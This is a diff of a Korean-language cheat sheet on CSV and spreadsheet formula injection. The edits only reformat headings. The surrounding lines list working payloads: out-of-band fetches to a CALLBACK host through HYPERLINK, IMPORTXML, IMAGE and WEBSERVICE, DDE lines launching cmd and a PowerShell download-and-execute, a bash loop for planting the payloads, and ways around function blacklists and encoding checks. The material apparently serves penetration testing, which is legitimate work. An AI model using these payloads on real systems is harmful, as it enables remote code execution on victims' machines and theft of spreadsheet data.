@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**수식 시작 문자 (개별 검증):**
+#### 수식 시작 문자 (개별 검증)
 
 | 페이로드 | Excel 효과 | 비고 |
 |---|---|---|
@@ -12,7 +12,7 @@
 | `\r=1+1` (CR) | trim 후 수식 평가 | 일부 환경 |
 | `0e1+1` | 과학 표기 후 수식 | drop-down 회피 |
 
-**OOB 페이로드 (Excel/Sheets에서 외부 fetch):**
+#### OOB 페이로드 (Excel/Sheets에서 외부 fetch)
 - `=HYPERLINK("https://CALLBACK.oast.fun/csv","click")` (Excel/Sheets)
 - `=IMPORTXML("https://CALLBACK/csv-import","//x")` (Google Sheets)
 - `=IMPORTDATA("https://CALLBACK/csv-data")` (Google Sheets)
@@ -20,19 +20,19 @@
 - `=IMAGE("https://CALLBACK/img")` (Google Sheets — 자동 fetch, 무경고)
 - `=WEBSERVICE("https://CALLBACK/ws")` (Excel Online)
 
-**DDE/RCE (구버전 Excel):**
+#### DDE/RCE (구버전 Excel)
 - `=cmd|'/C calc'!A1`
 - `=cmd|'/C powershell IEX(New-Object Net.WebClient).downloadString("https://CALLBACK/x")'!A1`
 - `=DDE("cmd";"/C calc";"!A1")` (LibreOffice)
 
-**Power Query (Excel 2016+ M language):**
+#### Power Query (Excel 2016+ M language)
 - `=Web.Contents("https://CALLBACK/m")` (Power Query)
 
-**Cell reference enumeration:**
+#### Cell reference enumeration
 - `=A1` (셀 참조 — 이메일/필터로 다른 사용자 데이터 fetch 가능)
 - `=Sheet2!A1`
 
-**검증 흐름:**
+#### 검증 흐름
 ```bash
 # 1. 페이로드 저장 (각 문자별 개별)
 for p in "=1+1" "+cmd" "-2+3" "@SUM(1)" $'\t=1+1' '=HYPERLINK("https://CALLBACK/csv","x")'; do
@@ -64,7 +64,7 @@ cat export.csv
 | 함수명 블랙리스트 (`HYPERLINK`) | `=HYPER`+`LINK(...)` (CSV에선 한 셀이라 분할 안 됨) — 다른 함수 사용 (`IMAGE`, `IMPORTXML`) |
 | Excel 보안 모드 | macro/DDE 차단되어도 `=HYPERLINK` 같은 내장 함수는 동작 |
 
-**다중 인코딩:**
+#### 다중 인코딩
 ```
 # UTF-8 BOM (자동 trim 후 수식 평가)
 \xef\xbb\xbf=HYPERLINK("https://CALLBACK","x")
